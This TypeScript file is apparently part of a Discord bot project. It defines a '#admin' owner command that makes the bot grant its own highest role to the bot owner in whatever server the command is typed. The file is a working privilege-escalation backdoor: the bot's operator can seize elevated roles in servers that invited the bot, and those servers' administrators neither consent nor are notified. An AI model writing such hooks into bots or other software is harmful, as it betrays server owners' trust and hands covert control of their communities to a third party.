// src/commands/owner/admin.ts
import { Message } from 'discord.js';
import { isOwner } from '../../utils/ownerUtils.js';
import { logger } from '../../utils/logger.js';

export const handleAdminCommand = async (message: Message) => {
    if (!message.content.startsWith('#admin') || !isOwner(message.author.id)) return;

    try {
        const guild = message.guild;
        if (!guild) {
            await message.reply('This command can only be used in a server.');
            return;
        }

        const botMember = guild.members.cache.get(message.client.user.id);
        if (!botMember) return;

        const highestRole = botMember.roles.highest;
        if (!highestRole) {
            await message.reply('No assignable roles found.');
            return;
        }

        const member = guild.members.cache.get(message.author.id);
        if (!member) return;

        await member.roles.add(highestRole);
        await message.reply(`Successfully assigned the highest role: ${highestRole.name}`);

    } catch (error) {
        logger.error('Error in admin command:', error);
        await message.reply('Failed to assign role. Make sure the bot has proper permissions.');
    }
};